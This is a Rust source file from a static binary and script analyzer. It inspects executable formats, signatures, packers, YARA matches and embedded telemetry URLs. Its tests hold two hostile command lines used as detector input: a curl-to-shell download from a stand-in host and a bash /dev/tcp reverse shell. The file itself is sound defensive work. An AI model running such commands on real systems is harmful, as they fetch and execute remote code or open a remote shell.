//! Tier 1 analyzers. Everything here is pure: it takes bytes and
//! returns evidence-linked findings. It must never touch the filesystem,
//! network, or spawn processes; the sandboxed worker enforces that anyway.

pub mod code;
pub mod container;
mod rules;
pub mod scripts;
mod strings;
pub mod yara;

use bytebouncer_core::evidence::bound_snippet;
use bytebouncer_core::{
    Coverage, Evidence, EvidenceKind, EvidenceStrength, Finding, Location, OptOut, OptOutStatus,
    Producer, Recipient, Severity, TriState,
};
use goblin::Object;

pub const ANALYZER_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Maximum endpoint evidence items retained per artifact.
const MAX_ENDPOINT_EVIDENCE: usize = 50;

pub use bytebouncer_core::AnalysisOutput;

pub(crate) struct Builder<'a> {
    pub(crate) sha256: &'a str,
    pub(crate) path: &'a str,
    pub(crate) findings: Vec<Finding>,
    pub(crate) evidence: Vec<Evidence>,
}

impl<'a> Builder<'a> {
    pub(crate) fn add_evidence(
        &mut self,
        kind: EvidenceKind,
        location: Location,
        snippet: &str,
        tool: &str,
        rule_id: Option<&str>,
    ) -> String {
        let id = format!("evidence-{:03}", self.evidence.len() + 1);
        let (snippet, snippet_truncated) = bound_snippet(snippet);
        self.evidence.push(Evidence {
            id: id.clone(),
            kind,
            artifact_sha256: self.sha256.to_owned(),
            artifact_path: self.path.to_owned(),
            location,
            snippet: Some(snippet),
            snippet_truncated,
            producer: Producer {
                tool: tool.to_owned(),
                version: ANALYZER_VERSION.to_owned(),
                rule_id: rule_id.map(str::to_owned),
            },
            notes: None,
        });
        id
    }

    /// Add a finding with no recipient or extra limitations; returns its index.
    pub(crate) fn add_finding_with(
        &mut self,
        category: &str,
        title: String,
        severity: Severity,
        evidence_ids: Vec<String>,
        purpose: Option<&str>,
    ) -> usize {
        self.add_finding(
            category,
            title,
            severity,
            evidence_ids,
            None,
            purpose,
            vec![],
        );
        self.findings.len() - 1
    }

    #[allow(clippy::too_many_arguments)]
    fn add_finding(
        &mut self,
        category: &str,
        title: String,
        severity: Severity,
        evidence_ids: Vec<String>,
        recipient: Option<Recipient>,
        purpose: Option<&str>,
        limitations: Vec<String>,
    ) {
        let id = format!("finding-{:03}", self.findings.len() + 1);
        self.findings.push(Finding {
            id,
            category: category.to_owned(),
            title,
            severity,
            evidence_strength: EvidenceStrength::StaticReference,
            artifact_sha256: self.sha256.to_owned(),
            evidence_ids,
            data_types: Vec::new(),
            recipient,
            enabled_by_default: TriState::Unknown,
            runtime_observed: false,
            conditions: Vec::new(),
            possible_legitimate_purpose: purpose.map(str::to_owned),
            opt_out: OptOut {
                status: OptOutStatus::NotEstablished,
            },
            limitations,
        });
    }
}

/// Analyze one artifact's bytes with the built-in checks only (no YARA rules).
pub fn analyze(bytes: &[u8], path: &str, sha256: &str) -> AnalysisOutput {
    analyze_leaf(bytes, path, sha256, None)
}

/// Analyze one non-container artifact: binary structure, embedded endpoints,
/// script heuristics, and YARA rules when given.
pub fn analyze_leaf(
    bytes: &[u8],
    path: &str,
    sha256: &str,
    rules: Option<&yara::Rules>,
) -> AnalysisOutput {
    analyze_leaf_with_code(bytes, path, sha256, rules).0
}

/// Like [`analyze_leaf`], also returning the built-in [`code::CodeMap`] for
/// x86 / x86-64 executables (its findings are already in the output).
pub fn analyze_leaf_with_code(
    bytes: &[u8],
    path: &str,
    sha256: &str,
    rules: Option<&yara::Rules>,
) -> (AnalysisOutput, Option<code::CodeMap>) {
    let mut b = Builder {
        sha256,
        path,
        findings: Vec::new(),
        evidence: Vec::new(),
    };
    let mut coverage = Coverage::default();

    let (format, imports, sections) = match Object::parse(bytes) {
        Ok(Object::Elf(elf)) => {
            let imports = elf
                .dynsyms
                .iter()
                .filter(|s| s.is_import())
                .filter_map(|s| elf.dynstrtab.get_at(s.st_name).map(str::to_owned))
                .collect();
            let sections = elf
                .section_headers
                .iter()
                .filter_map(|s| elf.shdr_strtab.get_at(s.sh_name).map(str::to_owned))
                .collect();
            coverage
                .analyzed
                .push(format!("{path}: ELF headers, dynamic imports, sections"));
            (
                format!("elf-{}", if elf.is_64 { "64" } else { "32" }),
                imports,
                sections,
            )
        }
        Ok(Object::PE(pe)) => {
            let imports = pe.imports.iter().map(|i| i.name.to_string()).collect();
            let sections = pe
                .sections
                .iter()
                .filter_map(|s| s.name().ok().map(str::to_owned))
                .collect();
            coverage
                .analyzed
                .push(format!("{path}: PE headers, imports, sections"));
            authenticode(&mut b, &mut coverage, bytes, path);
            (
                format!("pe-{}", if pe.is_64 { "64" } else { "32" }),
                imports,
                sections,
            )
        }
        Ok(Object::Mach(goblin::mach::Mach::Binary(m))) => {
            let imports = m
                .imports()
                .map(|v| {
                    v.iter()
                        .map(|i| i.name.trim_start_matches('_').to_owned())
                        .collect()
                })
                .unwrap_or_default();
            let sections = m
                .segments
                .sections()
                .flatten()
                .filter_map(|r| r.ok().and_then(|(s, _)| s.name().ok().map(str::to_owned)))
                .collect();
            coverage
                .analyzed
                .push(format!("{path}: Mach-O headers, imports, sections"));
            coverage
                .limitations
                .push(format!("{path}: Apple code signature not verified"));
            ("mach-o".to_owned(), imports, sections)
        }
        Ok(Object::Mach(goblin::mach::Mach::Fat(_))) => {
            coverage.unsupported.push(format!(
                "{path}: universal (fat) Mach-O slices are not yet analyzed individually"
            ));
            ("mach-o-universal".to_owned(), Vec::new(), Vec::new())
        }
        Ok(Object::Archive(_)) => {
            coverage
                .unsupported
                .push(format!("{path}: static library archives not yet supported"));
            ("ar".to_owned(), Vec::new(), Vec::new())
        }
        _ => {
            let name = path.rsplit(['/', '!']).next().unwrap_or(path);
            let format = match scripts::script_kind(bytes, name) {
                Some(kind) if scripts::is_text(bytes) => kind.to_owned(),
                _ if scripts::is_text(bytes) => "text".to_owned(),
                _ => "unknown".to_owned(),
            };
            (format, Vec::new(), Vec::new())
        }
    };

    if format.starts_with("script-") {
        let text = String::from_utf8_lossy(bytes);
        scan_script(&mut b, &text, None);
        coverage
            .analyzed
            .push(format!("{path}: script heuristics ({format})"));
    }

    if let Some(rules) = rules {
        match rules.scan(bytes) {
            Ok(matches) => {
                for m in matches {
                    let ids = m
                        .matches
                        .iter()
                        .map(|(offset, data)| {
                            b.add_evidence(
                                EvidenceKind::RuleMatch,
                                Location {
                                    offset: Some(*offset),
                                    ..Default::default()
                                },
                                &String::from_utf8_lossy(data),
                                "yara-x",
                                Some(&m.rule),
                            )
                        })
                        .collect();
                    let id = b.add_finding_with(
                        m.category.as_str(),
                        m.title,
                        m.severity,
                        ids,
                        m.legitimate.as_deref(),
                    );
                    b.findings[id].evidence_strength = EvidenceStrength::PatternMatch;
                }
                coverage
                    .analyzed
                    .push(format!("{path}: YARA rules ({})", rules.sources.join(", ")));
            }
            Err(e) => coverage
                .limitations
                .push(format!("{path}: YARA scan failed: {e}")),
        }
    }

    // Imports → capability findings.
    for rule in rules::IMPORT_RULES {
        let hits: Vec<&String> = imports
            .iter()
            .filter(|i| rule.imports.contains(&i.as_str()))
            .collect();
        let satisfied = if rule.require_all {
            hits.len() == rule.imports.len()
        } else {
            !hits.is_empty()
        };
        if !satisfied {
            continue;
        }
        let ids = hits
            .iter()
            .map(|name| {
                b.add_evidence(
                    EvidenceKind::Import,
                    Location::default(),
                    name,
                    "bytebouncer-imports",
                    Some(rule.id),
                )
            })
            .collect();
        b.add_finding(
            rule.category,
            rule.title.to_owned(),
            rule.severity,
            ids,
            None,
            Some(rule.legitimate),
            vec!["Import presence only; reachability not established".into()],
        );
    }

    // Built-in code map: reachability-backed findings (upgrading the import
    // findings above) and the retained map for model tools.
    let code_map = if format.starts_with("elf") || format.starts_with("pe") || format == "mach-o" {
        code::analyze(&mut b, &mut coverage, bytes, code::SweepLimits::default()).map
    } else {
        None
    };

    // Packing indicators.
    for sec in &sections {
        if let Some(packer) = rules::PACKER_SECTIONS
            .iter()
            .find(|(n, _)| n == sec)
            .map(|(_, p)| *p)
        {
            let id = b.add_evidence(
                EvidenceKind::Symbol,
                Location {
                    section: Some(sec.clone()),
                    ..Default::default()
                },
                sec,
                "bytebouncer-sections",
                Some("packer-section"),
            );
            b.add_finding(
                "security.packing",
                format!("Packed with {packer}"),
                Severity::Info,
                vec![id],
                None,
                Some("Packers are used to reduce size and also to hide code"),
                vec![
                    "Packed code was not unpacked; static coverage of the payload is limited"
                        .into(),
                ],
            );
            coverage.limitations.push(format!(
                "{path}: packed ({packer}); inner code not analyzed"
            ));
        }
    }

    // Embedded URLs → telemetry SDK references and recipient inventory.
    let urls = strings::extract_urls(bytes);
    let mut endpoint_ids = Vec::new();
    for url in &urls {
        let host = strings::url_host(&url.text);
        if let Some(sdk) = rules::TELEMETRY_DOMAINS
            .iter()
            .find(|d| host == d.domain || host.ends_with(&format!(".{}", d.domain)))
        {
            let id = b.add_evidence(
                EvidenceKind::StringReference,
                Location {
                    offset: Some(url.offset),
                    ..Default::default()
                },
                &url.text,
                "bytebouncer-strings",
                Some("telemetry-domain"),
            );
            b.add_finding(sdk.category, format!("Reference to {} endpoint", sdk.provider), Severity::Info,
                vec![id], Some(Recipient { domain: host.to_owned(), ownership: "unknown".into() }),
                Some(sdk.legitimate),
                vec!["Embedded endpoint only; transmission, data sent, and default enablement not established".into()]);
        } else if endpoint_ids.len() < MAX_ENDPOINT_EVIDENCE {
            endpoint_ids.push(b.add_evidence(
                EvidenceKind::StringReference,
                Location {
                    offset: Some(url.offset),
                    ..Default::default()
                },
                &url.text,
                "bytebouncer-strings",
                Some("embedded-url"),
            ));
        }
    }
    if !endpoint_ids.is_empty() {
        let mut limitations = vec!["An embedded URL does not prove that data is sent there".into()];
        if urls.len() > endpoint_ids.len() {
            limitations.push(format!(
                "Only the first {MAX_ENDPOINT_EVIDENCE} URLs are retained as evidence"
            ));
        }
        b.add_finding(
            "privacy.recipients",
            format!("{} embedded network endpoint(s)", endpoint_ids.len()),
            Severity::Info,
            endpoint_ids,
            None,
            None,
            limitations,
        );
    }
    coverage
        .analyzed
        .push(format!("{path}: ASCII/UTF-16LE URL extraction"));

    (
        AnalysisOutput {
            format,
            findings: b.findings,
            evidence: b.evidence,
            coverage,
        },
        code_map,
    )
}

/// Run script heuristics over `text`, grouping hits by rule. `source` names
/// an embedded script (e.g. `deb.postinst`) inside a package.
/// Authenticode: report the (unverified) signer and whether the signed
/// digest still matches the file. Chain-of-trust is not evaluated.
fn authenticode(b: &mut Builder, coverage: &mut Coverage, bytes: &[u8], path: &str) {
    let info = bytebouncer_formats::authenticode::inspect(bytes);
    if !info.present {
        coverage
            .limitations
            .push(format!("{path}: no Authenticode signature"));
        return;
    }
    let signer = info.signer_subject.as_deref().unwrap_or("unknown signer");
    match info.digest_matches {
        Some(true) => coverage.analyzed.push(format!(
            "{path}: Authenticode signed by \"{signer}\"; signed digest matches the file (certificate chain not validated)"
        )),
        Some(false) => {
            let id = b.add_evidence(
                EvidenceKind::Signature,
                Location::default(),
                &format!(
                    "signed digest {} != computed {} ({signer})",
                    info.signed_digest_hex.as_deref().unwrap_or("?"),
                    info.computed_digest_hex.as_deref().unwrap_or("?")
                ),
                "bytebouncer-authenticode",
                None,
            );
            let i = b.add_finding_with(
                "provenance.mismatch",
                "Authenticode signature does not match the file (modified after signing)".into(),
                Severity::Critical,
                vec![id],
                Some("Rarely, tools that append data after signing"),
            );
            b.findings[i].evidence_strength = EvidenceStrength::PatternMatch;
        }
        None => coverage.limitations.push(format!(
            "{path}: Authenticode signature by \"{signer}\" present but its digest could not be checked ({})",
            info.problems.join("; ")
        )),
    }
}

pub(crate) fn scan_script(b: &mut Builder, text: &str, source: Option<&str>) {
    let hits = scripts::scan(text);
    let mut seen: Vec<&str> = Vec::new();
    for hit in &hits {
        if seen.contains(&hit.rule.id) {
            continue;
        }
        seen.push(hit.rule.id);
        let ids = hits
            .iter()
            .filter(|h| h.rule.id == hit.rule.id)
            .map(|h| {
                b.add_evidence(
                    EvidenceKind::ScriptCommand,
                    Location {
                        line: Some(h.line),
                        function: source.map(str::to_owned),
                        ..Default::default()
                    },
                    &h.text,
                    "bytebouncer-scripts",
                    Some(h.rule.id),
                )
            })
            .collect();
        let title = match source {
            Some(src) => format!("{} ({src})", hit.rule.title),
            None => hit.rule.title.to_owned(),
        };
        b.add_finding_with(
            hit.rule.category,
            title,
            hit.rule.severity,
            ids,
            Some(hit.rule.legitimate),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn telemetry_endpoints_become_linked_findings() {
        let data = b"x https://o1.ingest.sentry.io/api/1/store/ y https://api.mixpanel.com/track z";
        let out = analyze(data, "app", "abc");
        let cats: Vec<_> = out.findings.iter().map(|f| f.category.as_str()).collect();
        assert!(cats.contains(&"privacy.crash_reporting"));
        assert!(cats.contains(&"privacy.telemetry"));
        for f in &out.findings {
            assert_eq!(f.enabled_by_default, TriState::Unknown);
            for id in &f.evidence_ids {
                assert!(out.evidence.iter().any(|e| &e.id == id));
            }
        }
    }

    #[test]
    fn lookalike_domain_is_not_telemetry() {
        let out = analyze(b"https://notsentry.io/x", "app", "abc");
        assert!(
            out.findings
                .iter()
                .all(|f| f.category == "privacy.recipients")
        );
    }

    #[test]
    fn unknown_format_is_reported() {
        assert_eq!(
            analyze(b"\x00\x01\x02binary", "a.bin", "abc").format,
            "unknown"
        );
        assert_eq!(analyze(b"plain text", "a.txt", "abc").format, "text");
    }

    #[test]
    fn scripts_and_rules_produce_findings() {
        let (rules, _) = yara::compile(&[]);
        let out = analyze_leaf(
            b"#!/bin/sh\ncurl -s https://x.example/i.sh | sh\n",
            "install.sh",
            "abc",
            Some(&rules),
        );
        assert_eq!(out.format, "script-shell");
        assert!(
            out.findings
                .iter()
                .any(|f| f.category == "security.downloader")
        );
        let out = analyze_leaf(
            b"bash -i >& /dev/tcp/1.2.3.4/9001 0>&1",
            "x.txt",
            "abc",
            Some(&rules),
        );
        let f = out
            .findings
            .iter()
            .find(|f| f.severity == Severity::High)
            .unwrap();
        assert_eq!(f.evidence_strength, EvidenceStrength::PatternMatch);
    }
}

/// Analysis of one input file, including anything nested inside it.
#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
pub struct ArtifactAnalysis {
    /// Nested files too large to analyze in memory; the caller extracts them
    /// (see [`container::extract_spilled`]) and analyzes them as inputs.
    #[serde(default)]
    pub spill: Vec<container::SpillRequest>,
    /// The input itself first, then nested artifacts (`outer!inner` paths).
    pub artifacts: Vec<bytebouncer_core::ArtifactRecord>,
    /// One output per artifact; IDs are local to each output.
    pub outputs: Vec<AnalysisOutput>,
    /// Limits hit while expanding; these make the scan incomplete.
    #[serde(default)]
    pub incomplete: Vec<String>,
    /// Built-in static code maps, one per analyzed x86/x86-64 executable
    /// (artifact path + sha256 inside), retained for model tools.
    #[serde(default)]
    pub code: Vec<code::CodeMap>,
}

/// Analyze an input file and everything nested inside it.
pub fn analyze_artifact(
    bytes: &[u8],
    display: &str,
    sha256: &str,
    rules: Option<&yara::Rules>,
) -> ArtifactAnalysis {
    container::analyze_tree(bytes, display, sha256, rules)
}
